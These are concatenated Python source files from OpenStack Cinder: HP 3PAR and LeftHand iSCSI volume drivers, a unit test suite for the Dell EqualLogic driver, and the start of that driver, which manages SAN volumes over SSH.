            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _("Least busy iSCSI port not found, "
                        "using first iSCSI port in list.")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """Return the list of candidate nsps."""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """Return IP assiciated with given nsp."""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """Return the active nsp, if one exists, for the given host."""
        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)                    
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split(",")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"Return the nsp that has the fewest active vluns."""
        # return only the nsp (node:server:port)
        result = self.common._cli_run('showvlun -a -showcols Port', None)                    

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)

#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
"""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """Runs a CLIQ command over SSH, without doing any result parsing"""
        cliq_arg_strings = []                    
        for k, v in cliq_args.items():
            cliq_arg_strings.append(" %s=%s" % (k, v))                    
        cmd = verb + ''.join(cliq_arg_strings)                    

        return self._run_ssh(cmd, check_exit_code)                    

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """Runs a CLIQ command over SSH, parsing and checking the output"""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_("CLIQ command returned %s"), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find("response")
            if response_node is None:
                msg = (_("Malformed response to CLIQ command "
                         "%(verb)s %(cliq_args)s. Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get("result")

            if result_code != "0":
                msg = (_("Error running CLIQ command %(verb)s %(cliq_args)s. "
                         " Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """Queries for info about the cluster (including IP)"""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml("getClusterInfo", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """Gets the IP on which a cluster shares iSCSI volumes"""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall("response/cluster/vip"):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_("Unexpected number of virtual ips for cluster "
                 " %(cluster_name)s. Result=%(_xml)s") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """Gets the volume info, including IQN"""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml("getVolumeInfo", cliq_args)

        # Result looks like this:
        #<gauche version="1.0">
        #  <response description="Operation succeeded." name="CliqSuccess"
        #            processingTime="87" result="0">
        #    <volume autogrowPages="4" availability="online" blockSize="1024"
        #       bytesWritten="0" checkSum="false" clusterName="Cluster01"
        #       created="2011-02-08T19:56:53Z" deleting="false" description=""
        #       groupName="Group01" initialQuota="536870912" isPrimary="true"
        #       iscsiIqn="iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b"
        #       maxSize="6865387257856" md5="9fa5c8b2cca54b2948a63d833097e1ca"
        #       minReplication="1" name="vol-b" parity="0" replication="2"
        #       reserveQuota="536870912" scratchQuota="4194304"
        #       serialNumber="9fa5c8b2cca54b2948a63d833097e1ca0000000000006316"
        #       size="1073741824" stridePages="32" thinProvision="true">
        #      <status description="OK" value="2"/>
        #      <permission access="rw"
        #            authGroup="api-34281B815713B78-(trimmed)51ADD4B7030853AA7"
        #            chapName="chapusername" chapRequired="true" id="25369"
        #            initiatorSecret="" iqn="" iscsiEnabled="true"
        #            loadBalance="true" targetSecret="supersecret"/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find("response/volume")
        for k, v in volume_node.attrib.items():
            volume_attributes["volume." + k] = v

        status_node = volume_node.find("status")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["status." + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find("permission")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["permission." + k] = v

        LOG.debug(_("Volume info: %(volume_name)s => %(volume_attributes)s") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """Creates a volume."""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml("createVolume", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
        iscsi_portal = self.cluster_vip + ":3260," + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = ("%s %s %s" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """Creates a volume from a snapshot."""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """Creates a snapshot."""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """Deletes a volume."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error("Volume did not exist. It will not be deleted")
            return
        self._cliq_run_xml("deleteVolume", cliq_args)

    def local_path(self, volume):
        msg = _("local_path not supported")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("assignVolumeToServer", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml("getServerInfo", cliq_args, False)
        response = out.find("response")
        result = response.attrib.get("result")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml("createServer", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """Unassign the volume from the host."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("unassignVolumeToServer", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml("getClusterInfo", {})
        cluster_node = result_xml.find("response/cluster")
        total_capacity = cluster_node.attrib.get("spaceTotal")
        free_capacity = cluster_node.attrib.get("unprovisionedSpace")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

import time

import mox
import paramiko

from cinder import context
from cinder import exception
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import test
from cinder.volume import configuration as conf
from cinder.volume.drivers import eqlx


LOG = logging.getLogger(__name__)


class DellEQLSanISCSIDriverTestCase(test.TestCase):

    def setUp(self):
        super(DellEQLSanISCSIDriverTestCase, self).setUp()
        self.configuration = mox.MockObject(conf.Configuration)
        self.configuration.append_config_values(mox.IgnoreArg())
        self.configuration.san_is_local = False
        self.configuration.san_ip = "10.0.0.1"
        self.configuration.san_login = "foo"
        self.configuration.san_password = "bar"
        self.configuration.san_ssh_port = 16022
        self.configuration.san_thin_provision = True
        self.configuration.eqlx_pool = 'non-default'
        self.configuration.eqlx_use_chap = True
        self.configuration.eqlx_group_name = 'group-0'
        self.configuration.eqlx_cli_timeout = 30
        self.configuration.eqlx_cli_max_retries = 5
        self.configuration.eqlx_chap_login = 'admin'
        self.configuration.eqlx_chap_password = 'password'
        self.configuration.volume_name_template = 'volume_%s'
        self._context = context.get_admin_context()
        self.driver = eqlx.DellEQLSanISCSIDriver(
            configuration=self.configuration)
        self.volume_name = "fakevolume"
        self.volid = "fakeid"
        self.connector = {'ip': '10.0.0.2',
                          'initiator': 'iqn.1993-08.org.debian:01:222',
                          'host': 'fakehost'}
        self.fake_iqn = 'iqn.2003-10.com.equallogic:group01:25366:fakev'
        self.driver._group_ip = '10.0.1.6'
        self.properties = {
            'target_discoverd': True,
            'target_portal': '%s:3260' % self.driver._group_ip,
            'target_iqn': self.fake_iqn,
            'volume_id': 1}
        self._model_update = {
            'provider_location': "%s:3260,1 %s 0" % (self.driver._group_ip,
                                                     self.fake_iqn),
            'provider_auth': 'CHAP %s %s' % (
                self.configuration.eqlx_chap_login,
                self.configuration.eqlx_chap_password)
        }

    def _fake_get_iscsi_properties(self, volume):
        return self.properties

    def test_create_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'create', volume['name'],
                                 "%sG" % (volume['size']), 'pool',
                                 self.configuration.eqlx_pool,
                                 'thin-provision').\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume(volume)
        self.assertEqual(model_update, self._model_update)

    def test_delete_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.driver._eql_execute('volume', 'select', volume['name'], 'offline')
        self.driver._eql_execute('volume', 'delete', volume['name'])
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_delete_absent_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1, 'id': self.volid}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show').\
            AndRaise(processutils.ProcessExecutionError(
                stdout='% Error ..... does not exist.\n'))
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_ensure_export(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.mox.ReplayAll()
        self.driver.ensure_export({}, volume)

    def test_create_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        snap_name = 'fake_snap_name'
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'create-now').\
            AndReturn(['Snapshot name is %s' % snap_name])
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'rename', snap_name,
                                 snapshot['name'])
        self.mox.ReplayAll()
        self.driver.create_snapshot(snapshot)

    def test_create_volume_from_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'select', snapshot['name'],
                                 'clone', volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume_from_snapshot(volume,
                                                               snapshot)
        self.assertEqual(model_update, self._model_update)

    def test_create_cloned_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        src_vref = {'id': 'fake_uuid'}
        volume = {'name': self.volume_name}
        src_volume_name = self.configuration.\
            volume_name_template % src_vref['id']
        self.driver._eql_execute('volume', 'select', src_volume_name, 'clone',
                                 volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_cloned_volume(volume, src_vref)
        self.assertEqual(model_update, self._model_update)

    def test_delete_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'delete', snapshot['name'])
        self.mox.ReplayAll()
        self.driver.delete_snapshot(snapshot)

    def test_extend_volume(self):
        new_size = '200'
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 100}
        self.driver._eql_execute('volume', 'select', volume['name'],
                                 'size', "%sG" % new_size)
        self.mox.ReplayAll()
        self.driver.extend_volume(volume, new_size)

    def test_initialize_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.stubs.Set(self.driver, "_get_iscsi_properties",
                       self._fake_get_iscsi_properties)
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'create', 'initiator',
                                 self.connector['initiator'],
                                 'authmethod chap',                    
                                 'username',
                                 self.configuration.eqlx_chap_login)
        self.mox.ReplayAll()
        iscsi_properties = self.driver.initialize_connection(volume,
                                                             self.connector)
        self.assertEqual(iscsi_properties['data'],
                         self._fake_get_iscsi_properties(volume))

    def test_terminate_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'delete', '1')
        self.mox.ReplayAll()
        self.driver.terminate_connection(volume, self.connector)

    def test_do_setup(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        fake_group_ip = '10.1.2.3'
        for feature in ('confirmation', 'paging', 'events', 'formatoutput'):
            self.driver._eql_execute('cli-settings', feature, 'off')
        self.driver._eql_execute('grpparams', 'show').\
            AndReturn(['Group-Ipaddress: %s' % fake_group_ip])
        self.mox.ReplayAll()
        self.driver.do_setup(self._context)
        self.assertEqual(fake_group_ip, self.driver._group_ip)

    def test_update_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        self.driver._update_volume_stats()
        self.assertEqual(self.driver._stats['total_capacity_gb'], 111.0)
        self.assertEqual(self.driver._stats['free_capacity_gb'], 11.0)

    def test_get_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        stats = self.driver.get_volume_stats(refresh=True)
        self.assertEqual(stats['total_capacity_gb'], float('111.0'))
        self.assertEqual(stats['free_capacity_gb'], float('11.0'))
        self.assertEqual(stats['vendor_name'], 'Dell')

    def test_get_space_in_gb(self):
        self.assertEqual(self.driver._get_space_in_gb('123.0GB'), 123.0)
        self.assertEqual(self.driver._get_space_in_gb('123.0TB'), 123.0 * 1024)
        self.assertEqual(self.driver._get_space_in_gb('1024.0MB'), 1.0)

    def test_get_output(self):

        def _fake_recv(ignore_arg):
            return '%s> ' % self.configuration.eqlx_group_name

        chan = self.mox.CreateMock(paramiko.Channel)
        self.stubs.Set(chan, "recv", _fake_recv)
        self.assertEqual(self.driver._get_output(chan), [_fake_recv(None)])

    def test_get_prefixed_value(self):
        lines = ['Line1 passed', 'Line1 failed']
        prefix = ['Line1', 'Line2']
        expected_output = [' passed', None]
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[0]),
                         expected_output[0])
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[1]),
                         expected_output[1])

    def test_ssh_execute(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['NoError: test run']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertEqual(self.driver._ssh_execute(ssh, cmd), expected_output)

    def test_ssh_execute_error(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(ssh, 'get_transport')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['Error: test run', '% Error']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertRaises(processutils.ProcessExecutionError,
                          self.driver._ssh_execute, ssh, cmd)

    def test_with_timeout(self):
        @eqlx.with_timeout
        def no_timeout(cmd, *args, **kwargs):
            return 'no timeout'

        @eqlx.with_timeout
        def w_timeout(cmd, *args, **kwargs):
            time.sleep(1)

        self.assertEqual(no_timeout('fake cmd'), 'no timeout')
        self.assertRaises(exception.VolumeBackendAPIException,
                          w_timeout, 'fake cmd', timeout=0.1)

    def test_local_path(self):
        self.assertRaises(NotImplementedError, self.driver.local_path, '')

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

"""Volume driver for Dell EqualLogic Storage."""

import functools
import random

import eventlet
from eventlet import greenthread
import greenlet
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import utils
from cinder.volume.drivers.san import SanISCSIDriver

LOG = logging.getLogger(__name__)

eqlx_opts = [
    cfg.StrOpt('eqlx_group_name',
               default='group-0',
               help='Group name to use for creating volumes'),
    cfg.IntOpt('eqlx_cli_timeout',
               default=30,
               help='Timeout for the Group Manager cli command execution'),
    cfg.IntOpt('eqlx_cli_max_retries',
               default=5,
               help='Maximum retry count for reconnection'),
    cfg.BoolOpt('eqlx_use_chap',
                default=False,
                help='Use CHAP authentication for targets?'),
    cfg.StrOpt('eqlx_chap_login',
               default='admin',
               help='Existing CHAP account name'),
    cfg.StrOpt('eqlx_chap_password',
               default='password',
               help='Password for specified CHAP account name',
               secret=True),
    cfg.StrOpt('eqlx_pool',
               default='default',
               help='Pool in which volumes will be created')
]


CONF = cfg.CONF
CONF.register_opts(eqlx_opts)


def with_timeout(f):
    @functools.wraps(f)
    def __inner(self, *args, **kwargs):
        timeout = kwargs.pop('timeout', None)
        gt = eventlet.spawn(f, self, *args, **kwargs)
        if timeout is None:
            return gt.wait()
        else:
            kill_thread = eventlet.spawn_after(timeout, gt.kill)
            try:
                res = gt.wait()
            except greenlet.GreenletExit:
                raise exception.VolumeBackendAPIException(
                    data="Command timed out")
            else:
                kill_thread.cancel()
                return res

    return __inner


class DellEQLSanISCSIDriver(SanISCSIDriver):
    """Implements commands for Dell EqualLogic SAN ISCSI management.

    To enable the driver add the following line to the cinder configuration:
        volume_driver=cinder.volume.drivers.eqlx.DellEQLSanISCSIDriver

    Driver's prerequisites are:
        - a separate volume group set up and running on the SAN
        - SSH access to the SAN
        - a special user must be created which must be able to
            - create/delete volumes and snapshots;
            - clone snapshots into volumes;
            - modify volume access records;

    The access credentials to the SAN are provided by means of the following
    flags
        san_ip=<ip_address>
        san_login=<user name>
        san_password=<user password>
        san_private_key=<file containing SSH private key>

    Thin provision of volumes is enabled by default, to disable it use:
        san_thin_provision=false

    In order to use target CHAP authentication (which is disabled by default)
    SAN administrator must create a local CHAP user and specify the following
    flags for the driver:
        eqlx_use_chap=true
        eqlx_chap_login=<chap_login>
        eqlx_chap_password=<chap_password>

    eqlx_group_name parameter actually represents the CLI prompt message
    without '>' ending. E.g. if prompt looks like 'group-0>', then the
    parameter must be set to 'group-0'

    Also, the default CLI command execution timeout is 30 secs. Adjustable by
        eqlx_cli_timeout=<seconds>
    """

    VERSION = "1.0.0"

    def __init__(self, *args, **kwargs):
        super(DellEQLSanISCSIDriver, self).__init__(*args, **kwargs)
        self.configuration.append_config_values(eqlx_opts)
        self._group_ip = None
        self.sshpool = None

    def _get_output(self, chan):
        out = ''
        ending = '%s> ' % self.configuration.eqlx_group_name
        while not out.endswith(ending):
            out += chan.recv(102400)

        LOG.debug(_("CLI output\n%s"), out)
        return out.splitlines()

    def _get_prefixed_value(self, lines, prefix):
        for line in lines:
            if line.startswith(prefix):
                return line[len(prefix):]
        return

    @with_timeout
    def _ssh_execute(self, ssh, command, *arg, **kwargs):
        transport = ssh.get_transport()
        chan = transport.open_session()
        chan.invoke_shell()

        LOG.debug(_("Reading CLI MOTD"))
        self._get_output(chan)

        cmd = 'stty columns 255'
        LOG.debug(_("Setting CLI terminal width: '%s'"), cmd)
        chan.send(cmd + '\r')
        out = self._get_output(chan)

        LOG.debug(_("Sending CLI command: '%s'"), command)
        chan.send(command + '\r')
        out = self._get_output(chan)

        chan.close()

        if any(line.startswith(('% Error', 'Error:')) for line in out):
            desc = _("Error executing EQL command")
            cmdout = '\n'.join(out)
            LOG.error(cmdout)
            raise processutils.ProcessExecutionError(
                stdout=cmdout, cmd=command, description=desc)
        return out

    def _run_ssh(self, cmd_list, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        LOG.info(_('EQL-driver: executing "%s"') % command)
                        return self._ssh_execute(
                            ssh, command,
                            timeout=self.configuration.eqlx_cli_timeout)
                    except processutils.ProcessExecutionError:
                        raise
                    except Exception as e:
                        LOG.exception(e)
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                msg = (_("SSH Command failed after '%(total_attempts)r' "
                         "attempts : '%(command)s'") %
                       {'total_attempts': total_attempts, 'command': command})
                raise exception.VolumeBackendAPIException(data=msg)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def _eql_execute(self, *args, **kwargs):
        return self._run_ssh(
            args, attempts=self.configuration.eqlx_cli_max_retries)

    def _get_volume_data(self, lines):
        prefix = 'iSCSI target name is '
        target_name = self._get_prefixed_value(lines, prefix)[:-1]
        lun_id = "%s:%s,1 %s 0" % (self._group_ip, '3260', target_name)
        model_update = {}
        model_update['provider_location'] = lun_id
        if self.configuration.eqlx_use_chap:
            model_update['provider_auth'] = 'CHAP %s %s' % \
                (self.configuration.eqlx_chap_login,
                 self.configuration.eqlx_chap_password)
        return model_update

    def _get_space_in_gb(self, val):
        scale = 1.0
        part = 'GB'
        if val.endswith('MB'):
            scale = 1.0 / 1024
            part = 'MB'
        elif val.endswith('TB'):
            scale = 1.0 * 1024
            part = 'TB'
        return scale * float(val.partition(part)[0])

    def _update_volume_stats(self):
        """Retrieve stats info from eqlx group."""

        LOG.debug(_("Updating volume stats"))
        data = {}
        backend_name = "eqlx"
        if self.configuration:
            backend_name = self.configuration.safe_get('volume_backend_name')
        data["volume_backend_name"] = backend_name or 'eqlx'
        data["vendor_name"] = 'Dell'
